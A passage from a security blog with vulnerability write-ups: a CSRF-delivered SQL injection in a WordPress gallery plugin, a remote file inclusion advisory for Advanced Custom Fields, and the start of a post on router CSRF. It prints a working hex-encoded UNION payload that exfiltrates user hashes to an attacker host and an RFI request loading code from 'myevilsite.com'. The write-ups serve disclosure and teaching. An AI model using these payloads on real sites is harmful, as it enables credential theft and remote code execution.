class="crayon-sy">$</span><span class="crayon-i">imageResults</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98772e71ba111345520-5"><span class="crayon-sy">?</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e71ba111345520-6"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c98772e71ba111345520-7"><span class="crayon-o">&lt;</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-e">Image </span><span class="crayon-i">Path</span><span class="crayon-o">:</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit_imagePath"</span><span class="crayon-h"> </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"75"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"<span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$image</span><span class="crayon-o">-&gt;</span><span class="crayon-i">imagePath</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span>"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e71ba111345520-8"><span class="crayon-o">&lt;</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-e">Image </span><span class="crayon-i">Title</span><span class="crayon-o">:</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit_imageTitle"</span><span class="crayon-h"> </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"20"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"<span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$image</span><span class="crayon-o">-&gt;</span><span class="crayon-i">title</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span>"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e71ba111345520-9"><span class="crayon-o">&lt;</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-e">Image </span><span class="crayon-i">Description</span><span class="crayon-o">:</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit_imageDescription"</span><span class="crayon-h"> </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"75"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"<span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$image</span><span class="crayon-o">-&gt;</span><span class="crayon-i">description</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span>"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e71ba111345520-10"><span class="crayon-o">&lt;</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-e">Sort </span><span class="crayon-i">Order</span><span class="crayon-o">:</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit_imageSort"</span><span class="crayon-h"> </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"10"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"<span class="crayon-ta">&lt;?php</span><span class="crayon-h"> </span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$image</span><span class="crayon-o">-&gt;</span><span class="crayon-i">sortOrder</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">?&gt;</span>"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">p</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0156 seconds] -->
<p>Bingo! Our injection vector is not blind. And what is more, keep in mind for later that no output encoding is done. This is important.</p>
<p><strong>CSRF vector</strong><br />
Without access to the WordPress administration interface directly, there&#8217;s a few means which we can achieve the delivery of a payload to exploit the SQL Injection vulnerability. Given that we need to deliver the items through the POST variables, we have to evaluate the application for the absence of any mitigation against CSRF attacks. In theory, a CSRF attack should be impossible. In reality though, many WordPress plugins do not CSRF protect their admin interfaces despite WordPress offering a very easy way of mitigating the attack.</p>
<p>Evaluating this for this attack vector can either be done by sampling a request with Burp Suite Pro and have it do the boring work of generating the appropriate form(Can be done by hand easily), or reading the code and see if there&#8217;s any actual CSRF tokens being inserted and validated anywhere that could be a kill joy for us. As it turns out, there&#8217;s a complete absence of this. So we now have a delivery method for a payload that could execute some arbitrary SQL and show the result to the user. But just outputting the list of users and their password to the admin user is rather boring. We need to find some way of exfiltration this data to us.</p>
<p><strong>Data exfiltration through XSS and magic quotes bypass</strong><br />
Remember back how we determined that the SQL results was in no way output encoded. It&#8217;s presumed of course that any data in the database was input by the admin, and as such completely not dangerous. What dangerous content can you possibly get from an integer column that auto-increments automagically? As it turns out, this is critical for turning this vulnerability into a beast.</p>
<p>We can&#8217;t possibly hope for the admin user to email us the result of the SQL injection output. So we need to somehow use the fact that we control the output of the SQL query to our advantage, and the fact that we can mostly unhindered write anything to the rendered page of the admin is a good start. So if we were able to put in either some JavaScript that&#8217;d infiltrate data for us, or a simple img tag which causes an external request, we can achieve our goal. Of course, the one thing that stops us is this pesky thing called magic quotes. We could try and put in some HTML into our SQL query, but if we have to use characters like quotes, magic quotes will make that a no-go. But what we can however do, is use the hex-literals feature that MySQL kindly offers us.</p>
<p>If you&#8217;ve never encountered hexadecimal literals before, you can try and neat little experiment in MySQL like this: SELECT CONCAT(&#8220;foo&#8221;, 0&#215;626172). This will output the string &#8220;foobar&#8221;. You can check out why by playing with the HEX and UNHEX methods, which will give you the hexadecimal values of different values. But slapping 0x in front of those values, it&#8217;ll act as if a string or integer for all intents and purposes. This offers us the wonderful ability to input arbitrary characters into a query using only hexadecimal digits(0-9 and A-F).</p>
<p><strong>Putting it all together</strong><br />
So far, we&#8217;ve determined:</p>
<ul>
<li>The plugin has a SQL injection vulnerability in the administrator interface</li>
<li>The SQLi is not blind</li>
<li>The output from the query is not output encoded</li>
<li>The plugin does not protect against CSRF attacks</li>
</ul>
<p>So we need to create a CSRF request which contains an image tag which contains an URL to a server we own, where the output of the SQL injection is in the src of the tag as a part of the query string. A bit of stitching together a CONCAT statement by encoding the HTML we need using HEX(), we end up with this result:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e71d7292262690" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form action="http://192.168.1.116/wordpress/wp-admin/admin.php?page=add-images" method="POST"&gt;
&lt;input type="hidden" name="galleryId" value="323432324 UNION SELECT CONCAT(0x223E3C696D67207372633D22687474703A2F2F7777772E6D796576696C736974652E63786D2F64656C69766572793F757365725F6C6F67696E3D, user_login, 0x26757365725F656D61696C3D, user_email, 0x26757365725F706173733D, user_pass, 0x22202F3E), 2, 3, 4, 5, 6 FROM wp_users #" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e71d7292262690-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e71d7292262690-2">2</div><div class="crayon-num" data-line="crayon-53c98772e71d7292262690-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e71d7292262690-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.1.116/wordpress/wp-admin/admin.php?page=add-images"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e71d7292262690-2"><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"galleryId"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"323432324 UNION SELECT CONCAT(0x223E3C696D67207372633D22687474703A2F2F7777772E6D796576696C736974652E63786D2F64656C69766572793F757365725F6C6F67696E3D, user_login, 0x26757365725F656D61696C3D, user_email, 0x26757365725F706173733D, user_pass, 0x22202F3E), 2, 3, 4, 5, 6 FROM wp_users #"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e71d7292262690-3"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p>With that, we end up with valid rows of &#8220;images&#8221; in the $imageResults query. When the ID parameter now gets output onto the page, we now have a HTML tag for each user on the site, like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e71e2929552981" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;img src="http://www.myevilsite.cxm/delivery?user_login=admin&amp;amp;user_email=foobar@gmail.com&amp;amp;user_pass=$P$BSQhEGPcLUPtNHcu93k3aSddiQQsO6/"&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e71e2929552981-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e71e2929552981-1"><span class="crayon-o">&lt;</span><span class="crayon-e">img </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"http://www.myevilsite.cxm/delivery?user_login=admin&amp;amp;user_email=foobar@gmail.com&amp;amp;user_pass=$P$BSQhEGPcLUPtNHcu93k3aSddiQQsO6/"</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>When the page then renders, the image tags will try and fetch each of these URLs. Given that you own the domain contained in the injection, you can now fetch the HTTP logs and now you have a full set of hashes for the WordPress installation. Game over!</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/01/27/vulnerability-chaining-magic-quotes-bypass-with-hexadecimal-literals-and-data-exfiltration/#comments" title="Comment on Vulnerability chaining, magic quotes bypass with hexadecimal literals and data exfiltration">4 Comments</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-217 -->

				
					
<article id="post-200" class="post-200 post type-post status-publish format-standard hentry category-security tag-advanced-custom-fields tag-rfi tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/11/14/wordpress-advanced-custom-fields-remote-file-inclusion-vulnerability/" title="11:53 pm" rel="bookmark" class="entry-date"><time datetime="2012-11-14T23:53:36+00:00" pubdate>November 14, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/11/14/wordpress-advanced-custom-fields-remote-file-inclusion-vulnerability/" title="Permalink to WordPress Advanced Custom Fields remote file inclusion vulnerability" rel="bookmark">WordPress Advanced Custom Fields remote file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/51037">Secunia Advisory SA 51037</a></p>
<div><strong>Analysis of vulnerability</strong></div>
<div>A Remote File Inclusion vulnerability exists in theÂ AdvancedÂ CustomÂ FieldsÂ plugin for WordPress. By exploiting an unsafe use of array_merge which takes user-input in <a href="http://plugins.svn.wordpress.org/advanced-custom-fields/trunk/core/actions/export.php">/core/actions/export.php</a>, it is possible to override a value used for an include:</div>
<div></div>
<div>
<!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e7dcc185051855" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// vars
$defaults = array(
	'acf_abspath' =&gt; '../../../../../',
	'acf_posts' =&gt; array()
);
$my_options = array_merge( $defaults, $_POST );

require_once( $my_options['acf_abspath'] . 'wp-load.php');
require_once( $my_options['acf_abspath'] . 'wp-admin/admin.php');</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e7dcc185051855-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e7dcc185051855-2">2</div><div class="crayon-num" data-line="crayon-53c98772e7dcc185051855-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e7dcc185051855-4">4</div><div class="crayon-num" data-line="crayon-53c98772e7dcc185051855-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e7dcc185051855-6">6</div><div class="crayon-num" data-line="crayon-53c98772e7dcc185051855-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e7dcc185051855-8">8</div><div class="crayon-num" data-line="crayon-53c98772e7dcc185051855-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e7dcc185051855-1"><span class="crayon-c">// vars</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e7dcc185051855-2"><span class="crayon-v">$defaults</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line" id="crayon-53c98772e7dcc185051855-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'acf_abspath'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'../../../../../'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e7dcc185051855-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'acf_posts'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98772e7dcc185051855-5"><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e7dcc185051855-6"><span class="crayon-v">$my_options</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">array_merge</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$defaults</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98772e7dcc185051855-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e7dcc185051855-8"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$my_options</span><span class="crayon-sy">[</span><span class="crayon-s">'acf_abspath'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98772e7dcc185051855-9"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$my_options</span><span class="crayon-sy">[</span><span class="crayon-s">'acf_abspath'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'wp-admin/admin.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0044 seconds] -->
<br />
By posting another value for acf_abspath to the script, we can overwrite the value which is used for the two require_once calls. For instance, we can make a request like this which will request /wp-load.php and /wp-admin/admin.php fromÂ myevilsite.com:</p>
</div>
<div>
<!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e7ddc185770814" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/advanced-custom-fields/core/actions/export.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

acf_abspath=http://myevilsite.com</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e7ddc185770814-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e7ddc185770814-2">2</div><div class="crayon-num" data-line="crayon-53c98772e7ddc185770814-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e7ddc185770814-4">4</div><div class="crayon-num" data-line="crayon-53c98772e7ddc185770814-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e7ddc185770814-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e7ddc185770814-1">POST /wordpress/wp-content/plugins/advanced-custom-fields/core/actions/export.php HTTP/1.1</div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e7ddc185770814-2">Host: 192.168.80.130</div><div class="crayon-line" id="crayon-53c98772e7ddc185770814-3">Content-Type: application/x-www-form-urlencoded</div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e7ddc185770814-4">Content-Length: 37</div><div class="crayon-line" id="crayon-53c98772e7ddc185770814-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e7ddc185770814-6">acf_abspath=http://myevilsite.com</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<br />
&nbsp;</p>
</div>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/advanced-custom-fields/" rel="tag">Advanced Custom Fields</a>, <a href="http://ceriksen.com/tag/rfi/" rel="tag">RFI</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/11/14/wordpress-advanced-custom-fields-remote-file-inclusion-vulnerability/#respond" title="Comment on WordPress Advanced Custom Fields remote file inclusion vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-200 -->

				
					
<article id="post-142" class="post-142 post type-post status-publish format-standard hentry category-security tag-csrf">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/09/29/two-stage-csrf-attacks/" title="6:48 pm" rel="bookmark" class="entry-date"><time datetime="2012-09-29T18:48:38+00:00" pubdate>September 29, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/09/29/two-stage-csrf-attacks/" title="Permalink to Two-stage CSRF attacks" rel="bookmark">Two-stage CSRF attacks</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p>This week I ran into an interesting problem. I was doing some poking around with my DLink DIR-615(EU) router while working on some firmware reverse engineering. ItÂ occurredÂ very quickly to me that the router had no protection against CSRF attacks. As with many other routers, the router also doesn&#8217;t enforce you to set a password for the Admin account, which simply sets it up for getting owned.</p>
<p>As it turns out, the vulnerability I found was already well-documented, but I saw no exploit which targeted both the CSRF attack and the default weak credentials in a single exploit. This would be needed for even a semi-reliable exploit to be delivered over the internet. I wondered why, and started investigating what would we required.</p>
<p><strong>The target</strong></p>
<p>The DLink DIR-615(EU) runs on a default IP(192.168.0.1) with default credentials being the Admin account with no password. The authentication system is kind of funky, in that on aÂ successfulÂ authentication no cookie is set. Rather, it simply authenticates your local IP. I&#8217;ve not dug into this much further, but the short version of this story is that you either have to hope that the user has authenticated against the router somewhat recently, or you need to authenticate as a part of the attack.</p>
<p>The two requests we need to make to log in and do something to abuse this CSRF, such as change the admin password and enable remote management, are as following:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e85fe967095788" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
